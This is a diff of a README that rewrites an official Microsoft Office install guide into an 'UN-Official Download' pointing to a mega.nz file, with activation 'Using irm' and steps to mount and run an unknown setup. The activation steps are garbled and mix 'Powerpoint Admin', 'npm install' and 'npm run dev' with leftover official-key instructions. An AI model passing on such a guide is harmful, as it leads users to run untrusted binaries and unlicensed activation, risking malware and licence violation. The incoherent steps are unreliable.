@@ -1,30 +1,27 @@
 # Microsoft Office – Download & Activation Guide
 
-A simple guide to download, install, and activate Microsoft Office legally using an official Microsoft account, subscription, school/work license, or genuine product key.
+A simple guide to download, install, and activate Microsoft Office Using **irm**
 
-## 📥 Official Download
+## 📥 UN-Official Download
 
 ### Microsoft 2019 / Office
 
 👉 **[Download Microsoft Office / Microsoft 2019](https://mega.nz/file/GPIEhRxC#OC4t_puLS5Hnzz7IafJF9t0qet3ywrwIOLqYNe_tNhw)**
 
-After opening the page:
+After Download:
 
-1. Click **Sign in**.
-2. Sign in with your Microsoft account or work/school account.
-3. Select **Install apps**.
-4. Select **Microsoft 365 apps**.
-5. Download and run the installer.
-6. Follow the installation instructions.
-
-Microsoft's official installation guide confirms this process.
+1. Right Click **Mount**.
+2. Install Setup
 
 ## 🔑 Activation
 
 After installation:
 
-1. Open **Microsoft Word**, **Excel**, or **PowerPoint**.
-2. Sign in using the Microsoft account that owns your Office license.
+1. Open **Powerpoint Admin**.
+2. ```bash
+npm install
+npm run dev
+```
 3. If you purchased a product key, redeem it through Microsoft's official setup page.
 4. Follow the activation instructions.
 5. Open:
